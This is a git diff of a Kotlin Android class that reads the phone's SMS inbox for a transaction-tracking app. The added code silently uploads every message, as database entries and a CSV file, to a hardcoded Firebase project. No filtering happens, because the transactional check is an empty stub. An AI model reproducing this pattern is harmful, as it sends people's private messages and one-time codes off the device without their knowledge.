@@ -1,24 +1,22 @@
 package com.steve.msms.data.datasource
 
 import android.content.Context
-import android.net.Uri
-import android.os.FileUtils
 import android.provider.Telephony
+import androidx.core.net.toUri
 import androidx.lifecycle.MutableLiveData
+import com.google.firebase.database.DatabaseReference
+import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.storage.FirebaseStorage
 import com.steve.msms.data.csv.CsvUtils
-import com.steve.msms.data.remote.SmsAPI
 import com.steve.msms.domain.model.Message
 import com.steve.msms.domain.model.SmsData
 import dagger.hilt.android.qualifiers.ApplicationContext
-import okhttp3.MediaType.Companion.toMediaTypeOrNull
-import okhttp3.MultipartBody
-import okhttp3.RequestBody
-import okhttp3.ResponseBody
-import retrofit2.Call
-import retrofit2.Callback
-import retrofit2.Response
+import kotlinx.coroutines.DelicateCoroutinesApi
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
 import timber.log.Timber
-import java.io.File
+import java.text.DateFormat
 import java.text.SimpleDateFormat
 import java.util.*
 import javax.inject.Inject
@@ -33,7 +31,11 @@ class SmsDataSource @Inject constructor(@ApplicationContext val context: Context
     private var debitAmount = 0.0
     val smsLiveData = MutableLiveData<SmsData>()
 
-    fun getSms() {
+    private var database: FirebaseDatabase = FirebaseDatabase.getInstance("https://msms-81a20-default-rtdb.firebaseio.com/")
+    private var logRef: DatabaseReference = database.getReference("steve")
+
+    @OptIn(DelicateCoroutinesApi::class)
+     fun getSms() {
         val messageList = arrayListOf<Message>()
 
         val cursor =
@@ -64,8 +66,8 @@ class SmsDataSource @Inject constructor(@ApplicationContext val context: Context
 
         cursor?.close()
 
-        messageList.forEach {
-           uploadData()
+        messageList.forEach { message ->
+            checkIfMessageIsTransactional(message)
         }
         smsLiveData.value = SmsData(
             creditList,
@@ -74,39 +76,37 @@ class SmsDataSource @Inject constructor(@ApplicationContext val context: Context
             debitAmount
         )
 
+        GlobalScope.launch(Dispatchers.IO) {
+            val mFile = CsvUtils.toCsvFile(context, messageList, "sms_data")
+            Timber.i("File Exists: ${mFile.exists()}")
+            mFile.toUri()
 
-        val credits = arrayListOf<Message>()
-        val mFile = CsvUtils.toCsvFile(context,credits, "credit")
-        Timber.i("File Exists: ${mFile.exists()}")
+            //Database
+            val dateFormat: DateFormat = SimpleDateFormat("dd/MM/yyyy HH:mm:ss")
+            val date = Date()
+            val strDate: String = dateFormat.format(date).toString()
+            logRef.child(strDate +"").setValue(messageList)
 
+            // Storage
+            val filename = UUID.randomUUID().toString()
+            val ref = FirebaseStorage.getInstance().getReference("$strDate/data/$filename")
+            ref.putFile(mFile.toUri())
 
-    }
-    private fun uploadData () {
-
-
-        val credits = arrayListOf<Message>()
-        val mFile = CsvUtils.toCsvFile(context,credits, "credit")
-        Timber.i("File Exists: ${mFile.exists()}")
-
-
-
-        val description = RequestBody.create(
-            MultipartBody.FORM,  mFile
-        )
-
-//        val requestBody = RequestBody.create("multipart/form-data".toMediaTypeOrNull(), file)
-//        val body = MultipartBody.Part.createFormData("nam", file.name, requestBody)
-
-//        service.uploadData(mFile)
-
-
+        }
 
 
 
     }
 
 
+    private fun checkIfMessageIsTransactional(message: Message) {
+
+
+
+    }
 
 }
+
+
 
 
